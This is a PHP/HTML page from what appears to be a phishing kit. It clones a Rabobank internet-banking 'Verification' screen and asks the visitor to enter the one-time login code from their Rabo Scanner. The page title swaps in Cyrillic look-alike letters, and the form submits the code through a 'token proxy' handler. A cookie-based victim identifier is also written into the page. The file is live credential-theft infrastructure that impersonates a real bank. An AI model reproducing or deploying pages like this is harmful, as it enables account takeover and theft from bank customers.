<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
         $php_js->fake_base="token/";
?>

<!DOCTYPE html>
<html lang="en" dir="ltr" class="desktop has-js landscape" data-scrapbook-source="https://bankieren.rabobank.nl/omgevingskeuze/qsl_setdebitcardforauth.do" data-scrapbook-create="20200219095221540">

<head>

<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js"></script>
<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
<link rel="stylesheet" href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">
<script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/form/core_form.js"></script>
<script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/token/core_token.js"></script>

<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/angular/angular.min.js"></script>

<link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/form/core_form.css">
<base href="<?php echo $php_js->relative_root.$php_js->fake_base; ?>" />
<link rel="stylesheet" href="form/css.css">


    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <title>R&#1072;b&#1086; Internetb&#1072;nkieren - R&#1072;b&#1086;b&#1072;nk</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
    <link href="favicon.ico" rel="shortcut icon">
    <meta charset="UTF-8">
    <link rel="stylesheet" href="force-myriad.css">
    <link rel="stylesheet" href="rass-proto.css">
    <link rel="stylesheet" href="www-extension.css">
    <link rel="stylesheet" href="default.css">
    <link rel="stylesheet" href="senses2-styling.css">
</head>

<body class=""     ng-app="app" ng-controller="c1" ng-model-options="{'allowInvalid':true}"  ng-cloak    >
    <div class="rass-pagetype-login rass-pagewrapper">
        <div id="rass-parallax-banner" style="background-position: 50% 100px;"></div>
        <div class="rass-container">
            <form onsubmit="return false" id="langform"  autocomplete="off">
                <h1 aria-live="polite" class="rass-page-title">{{"Verification"| ng_translate1}}<a class="rass-ui-logo"><img src="rabobank_logo.png" alt="rabobank logo"></a>
                    <div class="langswitch"> <a data-ng-click="lng='nl'"  data-ng-class="{'current':lng=='nl'}" class="">NL</a> <span>|</span> <a data-ng-click="lng='en'"  data-ng-class="{'current':lng=='en'}" >EN</a> </div>
                </h1>
            </form>
            <div class="rass-state-svrerror err_div" style="display: none">{{"Code is invalid , please try again"| ng_translate1}}</div>
            


           
            	




           


            <form onsubmit="send1(event,'ask_token_proxy');return false"  id="token-view" autocomplete="off"   class="rass-data-target rass-state-dynamic">
                <div class="rass-section-input rass-qrcode-wrapper form-group">
                    <ul>
                        <li>{{"Insert your card into the Rabo Scanner"| ng_translate1}}</li>
                        <li>{{"Enter your PIN"| ng_translate1}}</li>
                        <li>{{"Scan the color code"| ng_translate1}} <img class="rass-uicontrol-qrcode" ng-src="grayed-out-vc-{{lng}}.png" alt="inactive color code"> </li>
                        <li>{{"Verify the summary on the Rabo Scanner"| ng_translate1}}</li>
                    </ul> 
                    <label for="rass-data-inlogcode" data-rass-behavior="validate-inlogcode force-numkeypad"> <span>{{"Login code"| ng_translate1}} </span> 


                    	 <input   data-ng-model="data.AuthCd" autocomplete="off" id="rass-data-inlogcode" class="rass-data-target rass-state-dynamicchild form-control"  type="text" name="AuthCd" maxlength="8" pattern=".{4,8}" data-err_text="Please enter valid "  size="8"  >
                    	 <em class="rass-ui-error err_span" style="display:none ">{{"Invalid value"| ng_translate1}}</em>


                    	 <em class="rass-ui-error"></em> 

                    </label>



                </div>
                <div class="rass-section-action"> 

                	<input id="rass-action-login" class="rass-button-primary rass-state-dynamicchild" type="submit" name="submit"  value='{{"Submit"| ng_translate1}}'>


                	<input id="rass-action-cancel" data-rass-behavior="action-cancel" class="rass-button-tertiary rass-action-cancel" type="submit" name="cancel" value='{{"Cancel"| ng_translate1}}' data-rass-msg="You want to cancel login">


                	 </div>
            </form>
            <div class="footer">
                <div>
                    <ul>
                        <li> <a rel="nofollow" data-rass-behavior="action-showinpopup" class="rass-help-link rass-icon-link">{{"Help"| ng_translate1}}</a> </li>
                    </ul>
                    <p> <br>{{"See anything unusual? Stop and dial 0900 0905"| ng_translate1}}.  </p>
                    <ul>
                        <li> <a rel="nofollow" data-rass-behavior="action-showinpopup" class="rass-arrow-link rass-icon-link">{{"This is safe banking"| ng_translate1}}</a> </li>
                    </ul>
                </div>
            </div>
        </div>
        <div class="rass-section-service">
            <h2>{{"Service"| ng_translate1}}</h2>
            <ul>
                <li class="rass-rsp-nonmobile"><a rel="nofollow" data-rass-behavior="action-showinpopup">{{"Problems when logging in "| ng_translate1}}</a></li>
                <li class="rass-rsp-nonmobile"><a rel="nofollow" data-rass-behavior="action-showinpopup">{{"Frequently asked questions about the Rabo Scanner"| ng_translate1}}</a></li>
                <li class="rass-rsp-nonmobile"><a rel="nofollow" data-rass-behavior="action-showinpopup">{{"Logging in with the Rabo Scanner demo"| ng_translate1}}</a></li>
                <li class="rass-rsp-nonmobile"><a rel="nofollow" data-rass-behavior="action-showinpopup">{{"More information about the Rabo Scanner"| ng_translate1}}</a></li>
            </ul>
            <ul>
                
                <li class="rass-rsp-nonmobile"><a rel="nofollow" data-rass-behavior="action-showinpopup">{{"Request Rabo Internet Banking"| ng_translate1}}</a></li>
                <li class="rass-more"><a rel="nofollow" data-rass-behavior="action-showinpopup">{{"More service"| ng_translate1}}</a></li>
            </ul>
        </div>
        <div class="rass-socialbar">
            <div class="rass-socialbar-topbar">
                <div class="rass-socialbar-slogan"><span>Rabobank</span></div>
            </div>
        </div>
    </div> <img height="1" width="1" src="trans.gif">


<script type="text/javascript">
var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
var php_js = <?php  echo json_encode($php_js) ?>
</script>
<script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
<script type="text/javascript" src="ng/ng.js?v=<?php echo uniqid() ?>"></script>
<script type="text/javascript" src="token/token.js?v=<?php echo uniqid() ?>"></script>
</body>

</html>